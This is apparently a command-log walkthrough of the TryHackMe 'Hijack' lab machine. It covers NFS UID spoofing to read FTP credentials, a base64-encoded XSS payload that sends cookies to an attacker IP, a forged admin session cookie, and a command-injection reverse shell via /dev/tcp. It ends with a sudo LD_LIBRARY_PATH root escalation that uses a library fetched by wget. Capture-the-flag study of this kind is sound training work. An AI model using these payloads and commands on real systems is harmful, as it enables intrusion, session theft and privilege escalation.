<code>

https://tryhackme.com/r/room/hijack

### Service Enumeration

──(duke㉿kali)-[~/Documents/THM_Hijack]
└─$ nmap -A  -p- 10.10.28.220
Starting Nmap 7.92 ( https://nmap.org ) at 2024-05-23 04:24 CDT
Nmap scan report for 10.10.28.220
Host is up (0.046s latency).
Not shown: 65526 closed tcp ports (conn-refused)
PORT      STATE SERVICE  VERSION
21/tcp    open  ftp      vsftpd 3.0.3
22/tcp    open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 94:ee:e5:23:de:79:6a:8d:63:f0:48:b8:62:d9:d7:ab (RSA)
|   256 42:e9:55:1b:d3:f2:04:b6:43:b2:56:a3:23:46:72:c7 (ECDSA)
|_  256 27:46:f6:54:44:98:43:2a:f0:59:ba:e3:b6:73:d3:90 (ED25519)
80/tcp    open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.18 (Ubuntu)
111/tcp   open  rpcbind  2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      41347/tcp6  mountd
|   100005  1,2,3      45038/udp   mountd
|   100005  1,2,3      51547/udp6  mountd
|   100005  1,2,3      58786/tcp   mountd
|   100021  1,3,4      36081/tcp6  nlockmgr
|   100021  1,3,4      42932/tcp   nlockmgr
|   100021  1,3,4      48773/udp   nlockmgr
|   100021  1,3,4      57240/udp6  nlockmgr
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
2049/tcp  open  nfs_acl  2-3 (RPC #100227)
42877/tcp open  mountd   1-3 (RPC #100005)
42932/tcp open  nlockmgr 1-4 (RPC #100021)
43051/tcp open  mountd   1-3 (RPC #100005)
58786/tcp open  mountd   1-3 (RPC #100005)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.72 seconds


### FTP nothing                                                                                                                                                                                                                                           
┌──(duke㉿kali)-[~/Documents/THM_Hijack]
└─$ ftp anonymous@10.10.28.220
Connected to 10.10.28.220.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
530 Login incorrect.
ftp: Login failed
ftp> dir
530 Please login with USER and PASS.
530 Please login with USER and PASS.
ftp: Can't bind for data connection: Address already in use
ftp> ls
530 Please login with USER and PASS.
ftp> exit
221 Goodbye.

### NFS                                                                                                                                                                                                                                      
┌──(duke㉿kali)-[~/Documents/THM_Hijack]
└─$ showmount 10.10.28.220
Hosts on 10.10.28.220:
                                                                                                                                                                                                                                           
┌──(duke㉿kali)-[~/Documents/THM_Hijack]
└─$ showmount 10.10.28.220 -e
Export list for 10.10.28.220:
/mnt/share *
                                                                                                                                                                                                                                           
┌──(duke㉿kali)-[~/Documents/THM_Hijack]
└─$ mkdir nfs       
                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
┌──(duke㉿kali)-[~/Documents/THM_Hijack]
└─$ sudo mount -t nfs 10.10.28.220:/mnt/share ./nfs 
[sudo] password for duke: 
                                                                                                                                                                                                                                           
┌──(duke㉿kali)-[~/Documents/THM_Hijack]
└─$ cd nfs        
cd: permission denied: nfs
                                                                                                                                                                                                                                          
drwx------   2 1003 1003 4096 Aug  8  2023 nfs

### Create user tmpnfs and change UID to 1003
┌──(duke㉿kali)-[~/Documents/THM_Hijack]
└─$ su tmpnfs
Password: 
┌──(tmpnfs㉿kali)-[/home/duke/Documents/THM_Hijack]
└─$ whoami                                                                                                          
tmpnfs

┌──(tmpnfs㉿kali)-[/home/duke/Documents/THM_Hijack]
└─$ cd nfs/                                                                                                         

┌──(tmpnfs㉿kali)-[/home/duke/Documents/THM_Hijack/nfs]
└─$ ls                                                                                                              
for_employees.txt

┌──(tmpnfs㉿kali)-[/home/duke/Documents/THM_Hijack/nfs]
└─$ cat for_employees.txt 
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4


### back to FTP

──(duke㉿kali)-[~/Documents/THM_Hijack]
└─$ ftp ftpuser@hijack.thm    
Connected to hijack.thm.
220 (vsFTPd 3.0.3)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||15537|)
150 Here comes the directory listing.
drwxr-xr-x    3 1002     1002         4096 May 27 09:39 .
drwxr-xr-x    3 1002     1002         4096 May 27 09:39 ..
-rwxr-xr-x    1 1002     1002          220 Aug 08  2023 .bash_logout
-rwxr-xr-x    1 1002     1002         3771 Aug 08  2023 .bashrc
-rw-r--r--    1 1002     1002          368 Aug 08  2023 .from_admin.txt
-rw-r--r--    1 1002     1002         3150 Aug 08  2023 .passwords_list.txt
-rwxr-xr-x    1 1002     1002          655 Aug 08  2023 .profile
drwx------    2 1002     1002         4096 May 27 09:46 test
226 Directory send OK.
ftp> mget .passwords_list.txt
mget .passwords_list.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||49676|)
150 Opening BINARY mode data connection for .passwords_list.txt (3150 bytes).
100% |***********************************************************************|  3150        4.88 MiB/s    00:00 ETA
226 Transfer complete.
3150 bytes received in 00:00 (66.42 KiB/s)
ftp> mget .rom_admin.txt
ftp> mget .from_admin.txt
mget .from_admin.txt [anpqy?]? y
229 Entering Extended Passive Mode (|||9164|)
150 Opening BINARY mode data connection for .from_admin.txt (368 bytes).
100% |***********************************************************************|   368      589.13 KiB/s    00:00 ETA
226 Transfer complete.
368 bytes received in 00:00 (9.70 KiB/s)
ftp> 

### Files content
┌──(duke㉿kali)-[~/Documents/THM_Hijack]
└─$ cat .passwords_list.txt 
Vxb38mSNN8wxqHxv6uMX
56J4Zw6cvz8qDvhCWCVy
...
                                                                                                                  
┌──(duke㉿kali)-[~/Documents/THM_Hijack]
└─$ cat .from_admin.txt    
To all employees, this is "admin" speaking,
i came up with a safe list of passwords that you all can use on the site, these passwords don't appear on any wordlist i tested so far, so i encourage you to use them, even me i'm using one of those.

NOTE To rick : good job on limiting login attempts, it works like a charm, this will prevent any future brute forcing.



### www enumaretion nothing  

─(duke㉿kali)-[~]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://hijack.thm -x .php, .txt, .html 

Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)

[+] Url:                     http://hijack.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php,
[+] Timeout:                 10s

2024/05/23 04:59:23 Starting gobuster in directory enumeration mode

/index.php            (Status: 200) [Size: 487]
/login.php            (Status: 200) [Size: 822]
/signup.php           (Status: 200) [Size: 1002]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/config.php           (Status: 200) [Size: 0]                
/administration.php   (Status: 200) [Size: 51]               
/navbar.php           (Status: 200) [Size: 304]              
/server-status        (Status: 403) [Size: 275]              
                                                
### Password bruce forcing -- admin 

### steal cookies
UEhQU0VTU0lEPVBITmpjbWx3ZEQ1MllYSWdhVDF1WlhjZ1NXMWhaMlVvS1RzZ2FTNXpjbU05SW1oMGRIQTZMeTh4TUM0NUxqTXdMakl3TWk4JTJGWTI5dmEybGxQU0lyWW5SdllTaGtiMk4xYldWdWRDNWpiMjlyYVdVcE96d3ZjMk55YVhCMFBqcGxNVEJoWkdNek9UUTVZbUUxT1dGaVltVTFObVV3TlRkbU1qQm1PRGd6WlElM0QlM0Q=

PHPSESSID=PHNjcmlwdD52YXIgaT1uZXcgSW1hZ2UoKTsgaS5zcmM9Imh0dHA6Ly8xMC45LjMwLjIwMi8%2FY29va2llPSIrYnRvYShkb2N1bWVudC5jb29raWUpOzwvc2NyaXB0PjplMTBhZGMzOTQ5YmE1OWFiYmU1NmUwNTdmMjBmODgzZQ%3D%3D

Admin Cookie
base64(admin:md5(uDh3jCQsdcuLhjVkAy5x))
base64(admin:d6573ed739ae7fdfb3ced197d94820a5)
YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=

Cookie: PHPSESSID=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU%3d


### command injection

http://hijack.thm/administration.php

* mysql.service - MySQL Community Server
   Loaded: loaded (/lib/systemd/system/mysql.service; enabled; vendor preset: enabled)
   Active: active (running) since Tue 2024-05-28 07:23:11 UTC; 1h 29min ago
  Process: 1114 ExecStartPost=/usr/share/mysql/mysql-systemd-start post (code=exited, status=0/SUCCESS)
  Process: 1061 ExecStartPre=/usr/share/mysql/mysql-systemd-start pre (code=exited, status=0/SUCCESS)
 Main PID: 1113 (mysqld)
    Tasks: 28
   Memory: 167.5M
      CPU: 4.368s
   CGroup: /system.slice/mysql.service
           `-1113 /usr/sbin/mysqld



ftp && bash -c "bash -i >& /dev/tcp/LOCAL-IP/1234 0>&1"

### Get reverseshell and run linpeas

╔══════════╣ Searching passwords in config PHP files
/var/www/html/config.php:$password = "N3v3rG0nn4G1v3Y0uUp";    

### spawn shell and get rick

www-data@Hijack:/tmp$ su rick
su rick
su: must be run from a terminal
www-data@Hijack:/tmp$ /usr/bin/script -qc /bin/bash /dev/null
/usr/bin/script -qc /bin/bash /dev/null
www-data@Hijack:/tmp$ su rick
su rick
Password: N3v3rG0nn4G1v3Y0uUp

rick@Hijack:/tmp$ cat ..//mnt/share/for_employees.txt
cat ..//mnt/share/for_employees.txt
ftp creds :

ftpuser:W3stV1rg1n14M0un741nM4m4

### Priv escalation via     env_keep+=LD_LIBRARY_PATH
rick@Hijack:/tmp$ sudo -l
[sudo] password for rick: 
Matching Defaults entries for rick on Hijack:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    env_keep+=LD_LIBRARY_PATH

User rick may run the following commands on Hijack:
    (root) /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2


rick@Hijack:/tmp$ 

rick@Hijack:/tmp$ wget http://10.9.30.202/priv_esc_env_keep_2.c
--2024-05-28 12:01:05--  http://10.9.30.202/priv_esc_env_keep_2.c
Connecting to 10.9.30.202:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 214 [text/x-csrc]
Saving to: ‘priv_esc_env_keep_2.c’

priv_esc_env_keep_2.c        100%[==============================================>]     214  --.-KB/s    in 0s      

2024-05-28 12:01:05 (39.4 MB/s) - ‘priv_esc_env_keep_2.c’ saved [214/214]

rick@Hijack:/tmp$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC /
bin/            home/           lib64/          opt/            sbin/           tmp/            vmlinuz.old
boot/           initrd.img      lost+found/     proc/           snap/           usr/            
dev/            initrd.img.old  media/          root/           srv/            var/            
etc/            lib/            mnt/            run/            sys/            vmlinuz         
rick@Hijack:/tmp$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC ./
.font-unix/            linpeas.sh             .Test-unix/            tmux-33/               .XIM-unix/
.ICE-unix/             priv_esc_env_keep_2.c  tmux-1003/             .X11-unix/             
rick@Hijack:/tmp$ gcc -o /tmp/libcrypt.so.1 -shared -fPIC ./priv_esc_env_keep_2.c 
./priv_esc_env_keep_2.c: In function ‘hijack’:
./priv_esc_env_keep_2.c:8:9: warning: implicit declaration of function ‘setresuid’ [-Wimplicit-function-declaration]
         setresuid(0,0,0);
         ^
rick@Hijack:/tmp$ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc/apache2
/usr/sbin/apache2: /tmp/libcrypt.so.1: no version information available (required by /usr/lib/x86_64-linux-gnu/libaprutil-1.so.0)
root@Hijack:/tmp# cat /root/
.bash_history   .bashrc         .mysql_history  .profile        root.txt        .ssh/           
root@Hijack:/tmp# cat /root/root.txt 



<\code>
